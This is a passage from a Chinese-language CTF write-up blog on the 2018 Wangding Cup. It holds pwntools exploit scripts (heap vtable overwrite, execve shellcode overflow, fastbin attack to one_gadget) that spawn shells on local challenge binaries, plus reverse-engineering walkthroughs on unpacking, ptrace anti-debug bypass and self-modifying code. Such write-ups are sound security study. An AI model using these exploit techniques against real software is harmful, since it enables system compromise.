add(0x98,&#39;a&#39;*0x90+&#39;a&#39;*8) #1
show(1)
p.recvuntil(&#39;a&#39;*0x98)
heap=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
heap&gt;&gt;=12; heap&lt;&lt;=12
print(&#39;heap&#39;,hex(heap))
libc=heap-6201344
print(hex(libc))
stdout_vtable=3954424+libc-0x10

vtable=flat([
    0,0,0,0,0,0,0,
    0x4526a+libc
])
add(0x100,vtable+&#39;\n&#39;) #2
fvtable=heap+0x1b0

free(1)
add(0xc0,&#39;a&#39;*0x90+p64(0x40)+p64(stdout_vtable)+&#39;\n&#39;) #1
add(0x20,&#39;#3\n&#39;) #3
show(0) # 2nd
add(0x20,p64(fvtable)+&#39;\n&#39;) #4
# show(0)


p.interactive()</code></pre>
<h3 id="soEasy"><a href="#soEasy" class="headerlink" title="soEasy"></a>soEasy</h3><p>çœŸçš„easy</p>
<pre><code class="python">from pwn import * 
from primedbg import *
#context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
io=process(&#39;./pwn&#39;)
io.recvuntil(&#39;-&gt;&#39;)
buf_addr=int(io.recv(10),16)
print(hex(buf_addr))
sc = &#39;&#39;
sc += &#39;push 0x68732f\n&#39;
sc += &#39;push 0x6e69622f\n&#39;
sc +=  &#39;mov ebx, esp\n&#39;
sc += &#39;xor ecx, ecx\n&#39;
sc += &#39;xor edx, edx\n&#39;
sc += &#39;push 0xb\n&#39;
sc += &#39;pop eax\n&#39;
sc += &#39;int 0x80\n&#39;
sc=asm(sc)
sc=sc+(0x4c-len(sc))*chr(0x90)+p32(buf_addr)+&#39;\n&#39;   
print(len(sc))
io.send(sc)
io.interactive()</code></pre>
<h3 id="pesp"><a href="#pesp" class="headerlink" title="pesp"></a>pesp</h3><p>fastbin attack å †æº¢å‡º æ”¹å†™ item_list æŒ‡é’ˆå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚</p>
<pre><code>from pwn import * 
import primedbg
import sys
p=process(&#39;./pwn_new&#39;)
context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
team=0x0006020C8
item=0x06020C0 

def cmd(i):
    global p; p.sendlineafter(&#39;Your choice:&#39;,str(i))

def add(sz,c):
    global p; cmd(2)
    p.sendlineafter(&#39;f servant name:&#39;,str(sz))
    p.sendafter(&#39;ame of servant:&#39;,c)

def edit(i,sz,c):
    global p; cmd(3)
    p.sendlineafter(&#39;servant:&#39;,str(i))
    p.sendlineafter(&#39; servant name:&#39;,str(sz))
    p.sendlineafter(&#39;ew name of the servnat:&#39;,str(c))

def show():
    cmd(1)

def free(i):
    global p; cmd(4)
    p.sendlineafter(&#39;servant:&#39;,str(i))

add(0x28,&#39;#0\n&#39;)
add(0x28,&#39;#1\n&#39;) #1
add(0x28,&#39;#2\n&#39;) #2
add(0x31,&#39;top\n&#39;) #3
free(1)
edit(0,0x100,&#39;a&#39;*0x28+p64(0x31)+p64(item+16*3-8)+&#39;\n&#39;)
edit(0,0x28,&#39;/bin/sh\x00&#39;) #0
add(0x28,&#39;#1\n&#39;)


add(0x28,p64(0x602018)+p64(0x31)+p64(0x0602068)) #4 key #3
show()
if len(sys.argv)&gt;1:
    primedbg.attach_dbg(p,[0x0400C4B ],{&#39;team&#39;:team})
p.recvuntil(&#39;3 : &#39;)

m=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
puts_off=m-p.libc.address
libcbase=m-0x844f0
print(&#39;base&#39;,hex(libcbase))
pause()
edit(4,0x8,p64(libcbase+0xf1147))
cmd(4)
p.interactive()
</code></pre><h2 id="Revrese"><a href="#Revrese" class="headerlink" title="Revrese"></a>Revrese</h2><h3 id="i-like-pack"><a href="#i-like-pack" class="headerlink" title="i_like_pack"></a>i_like_pack</h3><p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417171730687.png" alt="upxåŠ å£³"></p>
<p>checksec ç¨‹åºæ˜æ˜¾åŠ å£³äº†ã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417171847110.png" alt></p>
<p>è„±å£³å¤±è´¥ï¼Œæ®ä¸€ç¯‡åšæ–‡è¯´å¯èƒ½upxçš„ç‰¹å¾å€¼è¢«ä¿®æ”¹äº†ï¼ˆåšå®Œé¢˜åè€ƒè¯ï¼‰ï¼Œå¯¼è‡´æ— æ³•ç”¨å·¥å…·è„±å£³ã€‚æ— å¥ˆå¦å¯»å‡ºè·¯äº†ã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417172048242.png" alt></p>
<p>åŠ äº†åè°ƒè¯•ã€‚  gdb è°ƒè¯•ç”¨äº†ptrace ï¼Œè¿™é‡Œåº”è¯¥å…³é—­äº†ã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417172316825.png" alt></p>
<pre><code>% strace ./re </code></pre><p>æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨ï¼Œæ„æ–™ä¹‹ä¸­ã€‚ </p>
<blockquote>
<p>bypass ptrace å¸¸è§æ–¹æ³•</p>
<ul>
<li>æ–¹æ³•ä¸€ï¼Œä¸ä½¿ç”¨ptraceè°ƒè¯•å™¨ï¼ˆgdbå°±æ˜¯åŸºäºptraceæœºåˆ¶ï¼‰</li>
<li>æ–¹æ³•äºŒï¼Œå°†ptraceéƒ¨åˆ†patchæ‰</li>
<li>æ–¹æ³•ä¸‰ï¼Œé€šè¿‡LD_PRELOADç¯å¢ƒå˜é‡å°†å¯æ‰§è¡Œæ–‡ä»¶æ‰§è¡Œè‡ªå·±å†™çš„ptraceå‡½æ•°</li>
<li>æ–¹æ³•å››ï¼Œé€šè¿‡catch syscall ptraceä¸‹ï¼Œç„¶åä¿®æ”¹ptraceè¿”å›å€¼</li>
</ul>
</blockquote>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417172915512.png" alt="èµ°èµ·ï¼"></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417173008090.png" alt></p>
<p>0x400000ï¼Œ64ä½åŠ¨æ€é“¾æ¥ELFçš„åŸºåœ°å€ã€‚dump 0x400000-0x611000</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/783FCB40E57DAE1542350DAEA00E5196.jpg" alt="dump"></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417174136085.png" alt="ida"></p>
<p>ç®€å•çš„ä¹±åºæ•°ç»„ã€‚ ida çš„ 0xf0e0 åœ°å€å¤„äºå †ï¼Œæ•°æ®ä¸ºç©ºï¼Œä¸æ™“å¾—ä¸ºä½•ã€‚ </p>
<p>gdb æŸ¥çœ‹å†…å­˜</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417174322395.png" alt></p>
<p>å¾ˆå¥½ï¼Œå†™è„šæœ¬ï¼Œå‡ºflag</p>
<pre><code>mem=[0x00000003,      0x00000004 ,     0x00000005,     0x00000006,
0x00000007,      0x00000008 ,     0x00000009,     0x0000000a,
0x0000000b,      0x0000000c ,     0x00000034,     0x00000035,
0x00000036,      0x00000037 ,     0x00000038,     0x00000039,
0x00000000,      0x00000000 ,     0x00000000,     0x00000000]

a = [11, 8, 7, 7, 8, 12, 3, 2, 16, 6, 13, 5, 7, 16, 4, 1, 0, 15, 16, 8, 3, 6, 14, 16, 0, 8, 6, 9, 12, 14, 13, 11, 15, 7, 11,14]

for i in range(36):
    print(chr(mem[a[i]]+45),end=&#39;&#39;)</code></pre><p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417174443823.png" alt></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417174502697.png" alt="å¼€å¿ƒ"></p>
<p><strong>To-do</strong></p>
<ol>
<li>upx è„±å£³å¤±è´¥åŸå› ã€‚</li>
<li>gdb åè°ƒè¯•åŸç†ã€‚</li>
<li>è°ƒè¯•å¤šè¿›ç¨‹ã€‚ </li>
<li>dump å†…å­˜ã€‚</li>
<li>è„±å£³æŠ€æœ¯ï¼ŒESPå®šå¾‹ã€‚</li>
</ol>
<p><strong>åŠ å£³</strong></p>
<p>åŠ å£³æ˜¯åœ¨äºŒè¿›åˆ¶çš„ç¨‹åºä¸­æ¤å…¥ä¸€æ®µä»£ç ï¼Œåœ¨è¿è¡Œçš„æ—¶å€™ä¼˜å…ˆå–å¾—ç¨‹åºçš„æ§åˆ¶æƒï¼Œåšä¸€äº›é¢å¤–çš„å·¥ä½œã€‚å¤§å¤šæ•°ç—…æ¯’å°±æ˜¯åŸºäºæ­¤åŸç†ã€‚æ˜¯åº”ç”¨åŠ å›ºçš„ä¸€ç§æ‰‹æ³•å¯¹åŸå§‹äºŒè¿›åˆ¶åŸæ–‡è¿›è¡ŒåŠ å¯†/éšè—/æ··æ·†ã€‚</p>
<p>åŠ å£³åŸå› ï¼š</p>
<ol>
<li>å¢åŠ ç ´è§£éš¾åº¦ã€‚</li>
<li>å¯¹äºæ¶æ„è½¯ä»¶æ¥è¯´ï¼Œç»•è¿‡æ€æ¯’è½¯ä»¶æŸ¥æ€ã€‚ </li>
</ol>
<p>* ä¼˜åŠ¿: â‘ ã€ä¿æŠ¤è‡ªå·±æ ¸å¿ƒä»£ç ç®—æ³•,æé«˜ç ´è§£/ç›—ç‰ˆ/äºŒæ¬¡æ‰“åŒ…çš„éš¾åº¦ â‘¡ã€è¿˜å¯ä»¥ç¼“è§£ä»£ç æ³¨å…¥/åŠ¨æ€è°ƒè¯•/å†…å­˜æ³¨å…¥æ”»å‡». </p>
<ul>
<li>åŠ£åŠ¿: â‘ ã€å½±å“å…¼å®¹æ€§ â‘¡ã€å½±å“ç¨‹åºè¿è¡Œæ•ˆç‡.</li>
</ul>
<h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>è¿™æ˜¯ä¸€é“ ç®€å•çš„ .NET é€†å‘é¢˜ã€‚ä½¿ç”¨ dnSpy åŠ¨æ€è°ƒè¯•ï¼Œèƒ½çœ‹åˆ°åç¼–è¯‘çš„æºç ã€‚</p>
<p>å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œæ‰¾åˆ°åˆé€‚çš„åˆ©å™¨äº‹åŠåŠŸå€ã€‚dnSpy </p>
<blockquote>
<p>å¸¸è§è¯­è¨€çš„åç¼–è¯‘åæ±‡ç¼–å·¥å…·:</p>
<p>C/C++: IDA Pro</p>
<p>.NET: dnSpy ã€ JetBrains dotPeek</p>
<p>python: uncompyle6 </p>
</blockquote>
<p>è°ƒè¯•æ–¹æ³•ï¼š</p>
<ol>
<li>æ‰“å¼€ç¨‹åºï¼Œç‚¹å‡»è¿è¡Œï¼Œç‚¹ flag æŒ‰é’®ã€‚</li>
<li>ä»£ç çª—å£åœç•™åœ¨äº† messagebox å½“ä¸­ã€‚</li>
<li>è·³å‡ºåº“å‡½æ•°ï¼Œæ¥åˆ°äº† WindowsApp1</li>
<li>flag æ˜æ–‡å†™åœ¨äº† Form1 å’Œ Form1_Load å½“ä¸­ã€‚</li>
</ol>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200418000713454.png" alt></p>
<p><strong>Todo</strong></p>
<ol>
<li><p>å¤šç»ƒä¸€é“ .NET é€†å‘é¢˜ã€‚ </p>
</li>
<li><p>äº†è§£å·¥å…· </p>
<blockquote>
<p><a href="https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=124" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=forumdisplay&amp;fid=4&amp;filter=typeid&amp;typeid=124</a></p>
</blockquote>
</li>
</ol>
<h3 id="SimpleSMC"><a href="#SimpleSMC" class="headerlink" title="SimpleSMC"></a>SimpleSMC</h3><p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211121049.png" alt></p>
<p>ç¨‹åºæ˜¯é™æ€é“¾æ¥ç¼–è¯‘çš„ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211203776.png" alt></p>
<p>éšæœºè¾“å…¥å‘ç”Ÿæ®µé”™è¯¯ã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211243535.png" alt></p>
<p>å¯¼å…¥ FLIRT ç­¾åæ–‡ä»¶</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211326592.png" alt></p>
<p>é€‰æ‹©æœ€è¿‘çš„ç¯å¢ƒã€‚ æ­¤å¤„æ˜¯ ubuntu16.04 ã€‚åŸå› å¦‚ä¸‹ã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211411581.png" alt></p>
<p>å¯¼å…¥ç­¾åæ–‡ä»¶åï¼Œå·¦ä¾§çš„å‡½æ•°åç§°æ¢å¤äº†å¤§éƒ¨åˆ†ã€‚æœç´¢å­—ç¬¦ä¸²å®šä½åˆ° mainã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211551441.png" alt></p>
<p>loc_400bac ç”¨åˆ°äº†å‚æ•° v5ï¼Œ v5 æ˜¯ è¾“å…¥çš„ä¸€éƒ¨åˆ†ã€‚ç›¸å¯¹å¯¹v4åç§»21ä¸ªå­—èŠ‚ã€‚ ä»ä¼ªä»£ç å¯ä»¥çœ‹å‡ºï¼Œå½“ä¸¤ä¸ªå‡½æ•°è¿”å›çœŸæ—¶ï¼Œå°±ç ´è§£æˆåŠŸäº†ã€‚ </p>
<p>ç‚¹è¿› loc_400bac å‡½æ•°ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆå®è´ã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421211802158.png" alt></p>
<p>0x400bc8 æœ‰èŠ±æŒ‡ä»¤ã€‚ èŠ±æŒ‡ä»¤çš„å­˜åœ¨å¹²æ‰°æˆ‘ä»¬é˜…è¯»åæ±‡ç¼–ä»£ç ï¼Œå¢åŠ ç ´è§£éš¾åº¦ã€‚ æˆ‘ä»¬éœ€è¦å»èŠ±ã€‚ 0x400bbc ç›´æ¥è·³è½¬åˆ° loc_400bc9 ï¼Œé‚£ç›´æ¥æŠŠ 0x400bc8 ä¸€ä¸ªå­—èŠ‚ E8 nop æ‰ï¼ˆæ”¹æˆ 0x90) ã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421212325016.png" alt></p>
<p>å·¦ä¾§çº¢æ£•è‰²å¯ä»¥çœ‹å‡ºï¼Œè¿™éƒ¨åˆ†æ±‡ç¼–ä»£ç è¿è¡Œä¸äº†ã€‚å› ä¸ºå®ƒæ„æˆå®Œæ•´çš„å‡½æ•°è°ƒç”¨ã€‚ å³é”®ç”Ÿæˆå‡½æ•°ã€‚ F5 çœ‹æºç </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421212538679.png" alt></p>
<p>loc_400aa6 çš„è¿ç»­è‹¥å¹²å­—èŠ‚è¢«æ”¹äº†ã€‚textæ®µå¯æ”¹ã€‚æ€ªä¸å¾—å« SMC (Self Modify Code) ã€‚ åº”è¯¥è°ƒç”¨äº† mprotect ï¼Œå»éªŒè¯çŒœæƒ³ã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421212701551.png" alt></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421212724499.png" alt></p>
<p>F5 çœ‹æºç å¼¹å‡ºé”™è¯¯ï¼Œä¿®æ”¹ä¸€ä¸‹ sp å€¼è°ƒæ•´ä¸ºæ ˆå¹³è¡¡ã€‚ (alt + K å¿«æ·é”®)ã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421213102752.png" alt></p>
<p><code>add rsp,4</code>  ï¼Œæ•…åœ¨ leave ä¹‹å‰å¹³è¡¡æ ˆé¡¶ï¼Œä¿®æ”¹åï¼Œå³å¯ F5ã€‚ ä½†å­˜åœ¨èŠ±æŒ‡ä»¤å¹²æ‰°ã€‚æŒ‰ç…§åˆšæ‰çš„æ–¹æ³•å»èŠ±ã€‚å†çœ‹æºç ã€‚ å¯ä»¥é€‚å½“å»æ‰ä¸€äº›è·³è½¬æŒ‡ä»¤ï¼Œå¯ä»¥ä½¿å¾—æºç æ›´å¥½çœ‹ã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421213226848.png" alt="call =&gt; nop"></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421213548446.png" alt></p>
<p>éªŒè¯äº†è°ƒç”¨ mprotect çš„çŒœæƒ³ã€‚ 19è¡Œ å’Œ sub_41e1b0 è¿›è¡Œäº†å¼‚æˆ–å˜æ¢ã€‚ æ³¨æ„åˆ° -61=0xc3 ï¼Œæ˜¯ retæŒ‡ä»¤çš„æœºå™¨ç ã€‚ æ‰€ä»¥æ‰§è¡Œåˆ° sub_400bac å‡½æ•°æ—¶ï¼Œ loc_400aa6 å‡½æ•°å—çš„æ•°æ®æ—©å·²è¢«ä¿®æ”¹ã€‚ è¿™é‡Œçš„æ•°æ®éœ€è¦åŠ¨æ€è°ƒè¯•è·å¾—ï¼Œæˆ–è€…IDAPythonç›´æ¥æ”¹textçš„å†…å®¹ã€‚</p>
<p>è¿”å›åˆ° 400bac å‡½æ•°çœ‹çœ‹ã€‚ a1[0..6] ä¸ƒä¸ªå­—èŠ‚å¼‚æˆ–ï¼Œè¿™ä¸ª7ä¸ªå­—èŠ‚çš„keyè¦çŒœæµ‹ã€‚ loc_0x400aa6 æ˜¯ä¸€ä¸ªå®Œæ•´çš„å‡½æ•°ã€‚é‚£ä¹ˆå¼€å¤´æŒ‡ä»¤å¿…å®šæ˜¯ <code>push rbp; mov rbp, rsp; sub rsp ???</code>  å¯¹åº”çš„æŒ‡ä»¤ä¸º <code>55 48 89 E5 48 83 EC</code></p>
<p> <img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421213918114.png" alt></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421215404190.png" alt></p>
<p>ä¸‹æ–­åˆ°è¿™é‡ŒæŸ¥çœ‹å†…å®¹ã€‚</p>
<p> <img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421215439914.png" alt></p>
<p>æ‹·è´å‰å…­ä¸ªå­—èŠ‚ï¼Œå†™è„šæœ¬å¾—å‡ºkey</p>
<pre><code class="ruby">data=[0x13 ,0x79 ,0xc9 ,0x82 ,0x0b ,0xeb,0x89]
fcode=[0x55 ,0x48 ,0x89 ,0xE5 ,0x48 ,0x83 ,0xEC]
key=&#39;&#39;
(0..6).each do |i| key&lt;&lt;(fcode[i]^data[i]).chr end
puts key</code></pre>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421220034417.png" alt></p>
<p>key=F1@gChe</p>
<p>å†™è¿›IDAPthonä¿®æ”¹ loc_400aa6 å¤„çš„æ•°æ®ã€‚ </p>
<pre><code class="python">key=&#39;F1@gChe&#39;

addr=0x400aa6 
malloc_addr=0x041E1B0

i=0
while(Byte(addr+i)!=0xc3):
    PatchByte(addr+i,Byte(addr+i)^Byte(malloc_addr+i))
    i+=1

i=0
while(Byte(addr+i)!=0xc3):
    PatchByte(addr+i,Byte(addr+i)^ord(key[i%7]))
    i+=1 
</code></pre>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421220336901.png" alt></p>
<p>æŒ‰då¯ä»¥è½¬æ¢æ•°æ®ä¸ºcodeï¼Œæ–¹ä¾¿æˆ‘ä»¬é˜…è¯»æ±‡ç¼–ï¼Œç¾åŒ–åï¼ŒæŒ‰ F5ï¼Œå®Œç¾ã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421220508503.png" alt></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200421220519609.png" alt></p>
<p>æŠ˜åŠå¼‚æˆ–ã€‚é€†åºå¼‚æˆ–å³å¯å¾—å‡ºflagã€‚ ç¬¬ä¸€æ¬¡åšå‡ºè¿™ä¹ˆå¤æ‚çš„é€†å‘ã€‚ å—¨æ£®  ;-)</p>
<p><strong>è§£å¯†è„šæœ¬</strong></p>
<pre><code class="ruby">#/bin/ruby
key=[ 0x66, 0x0A, 0x07, 0x0B, 0x1D, 0x08, 0x51, 0x38, 0x1F, 0x5C,  0x14, 0x38, 0x30, 0x0A, 0x1A, 0x28, 0x39, 0x59, 0x0C, 0x24,  0x24, 0x22, 0x01, 0x1F, 0x1E, 0x73, 0x1D, 0x3A, 0x08, 0x05, 0x15, 0x0A]
s=&#39;&#39;
i=1 
until i==32 do (0..i-1).each do |k| key[k+i] ^= key[k]  end ; i &lt;&lt;= 1 end 

key.each do |i| s&lt;&lt;i.chr end

puts s

#flag{d0_y0u_Kn*w_5mC_F1@gCheCk?}</code></pre>
<p><strong>Todo</strong></p>
<ol>
<li>ç¼–è¯‘é™æ€é“¾æ¥ç¨‹åºï¼Œåœ¨IDAä¸­æ¢å¤ç¬¦å·è¡¨ <a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">https://github.com/push0ebp/sig-database</a></li>
</ol>
<h2 id="ç½‘é¼æ¯REè€ƒç‚¹"><a href="#ç½‘é¼æ¯REè€ƒç‚¹" class="headerlink" title="ç½‘é¼æ¯REè€ƒç‚¹"></a>ç½‘é¼æ¯REè€ƒç‚¹</h2><ol>
<li>pythonå­—èŠ‚ç   è‡ªå·±å†™ä¸€ä¸ªã€‚</li>
<li>èŠ±æŒ‡ä»¤å»é™¤ </li>
<li>.NET åŠ¨æ€è°ƒè¯•ã€‚</li>
<li>åè°ƒè¯•ã€åŠ å£³æŠ€æœ¯ã€‚ </li>
</ol>
<h2 id="é€†å‘ä¾‹é¢˜"><a href="#é€†å‘ä¾‹é¢˜" class="headerlink" title="é€†å‘ä¾‹é¢˜"></a>é€†å‘ä¾‹é¢˜</h2><p>æ¨èï¼š<a href="https://capturetheflag.withgoogle.com/#beginners/reversing-rand2" target="_blank" rel="noopener">https://capturetheflag.withgoogle.com/#beginners/reversing-rand2</a></p>
<p>JavisOJ Crackme1 Crackme2 </p>
<h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p>ODä½¿ç”¨æ•™ç¨‹ <a href="https://blog.csdn.net/dyxcome/article/details/91348410" target="_blank" rel="noopener">https://blog.csdn.net/dyxcome/article/details/91348410</a> </p>
<p>é€†å‘å·¥å…·<a href="https://down.52pojie.cn/Tools/PEtools/" target="_blank" rel="noopener">https://down.52pojie.cn/Tools/PEtools/</a></p>
<p>å…³é—­aslr <a href="http://www.sweetscape.com/download/010EditorWin64Installer.exe" target="_blank" rel="noopener">http://www.sweetscape.com/download/010EditorWin64Installer.exe</a> </p>
<p>vmpy <a href="https://medium.com/@julianrunnels/google-ctf-reversing-a-program-made-of-emojis-b4c8af473278" target="_blank" rel="noopener">https://medium.com/@julianrunnels/google-ctf-reversing-a-program-made-of-emojis-b4c8af473278</a></p>

      
       <hr><span style="font-style: italic;color: gray;"> è½¬è½½è¯·æ³¨æ˜æ¥æºï¼Œæ¬¢è¿å¯¹æ–‡ç« ä¸­çš„å¼•ç”¨æ¥æºè¿›è¡Œè€ƒè¯ï¼Œæ¬¢è¿æŒ‡å‡ºä»»ä½•æœ‰é”™è¯¯æˆ–ä¸å¤Ÿæ¸…æ™°çš„è¡¨è¾¾ã€‚å¯ä»¥åœ¨ä¸‹é¢è¯„è®ºåŒºè¯„è®ºã€‚ </span>
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">æ–‡ç« æ ‡é¢˜:</span>2018ç½‘é¼æ¯</p>
    
    <p><span class="copy-title">æœ¬æ–‡ä½œè€…:</span><a  title="æ«äº‘æ">æ«äº‘æ</a></p>
    <p><span class="copy-title">å‘å¸ƒæ—¶é—´:</span>2020-04-15, 00:00:00</p>
    <p><span class="copy-title">æœ€åæ›´æ–°:</span>2020-04-21, 22:11:24</p>
    <span class="copy-title">åŸå§‹é“¾æ¥:</span><a class="post-url" href="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/" title="2018ç½‘é¼æ¯">https://primelyw.github.io/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/</a>
    <p>
        <span class="copy-title">ç‰ˆæƒå£°æ˜:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"ç½²å-éå•†ç”¨-ç›¸åŒæ–¹å¼å…±äº« 4.0"</a> è½¬è½½è¯·ä¿ç•™åŸæ–‡é“¾æ¥åŠä½œè€…ã€‚
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">Â©2020 æ«äº‘æ</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">ç›®å½•</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*ä½œè€…ã€æ ‡ç­¾çš„è‡ªåŠ¨è¡¥å…¨*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#Pwn','#CTF','#CVE','#fuzz','#afl','#Defcon','#ruby','#lang',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*æ¸²æŸ“å¯¹åº”çš„è¡¨æ ¼æ ·å¼*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*æ¸²æŸ“æ‰“èµæ ·å¼*/
        

        /*é«˜äº®ä»£ç å—è¡Œå·*/
        
        $('pre code').each(function(){
            var lines = $(this).text().trim().split('\n').length, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*è®¿é—®æ•°é‡*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*ä»£ç é«˜äº®ï¼Œè¡Œå·å¯¹é½*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*æ‰“èµé¡µé¢éšè—ä¸å±•ç¤º*/
    

</script>

<!--åŠ å…¥è¡Œå·çš„é«˜äº®ä»£ç å—æ ·å¼-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--è‡ªå®šä¹‰æ ·å¼è®¾ç½®-->
<style>
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*åˆ—è¡¨æ ·å¼*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* èƒŒæ™¯å›¾æ ·å¼ */
    
    


    /*å¼•ç”¨å—æ ·å¼*/
    

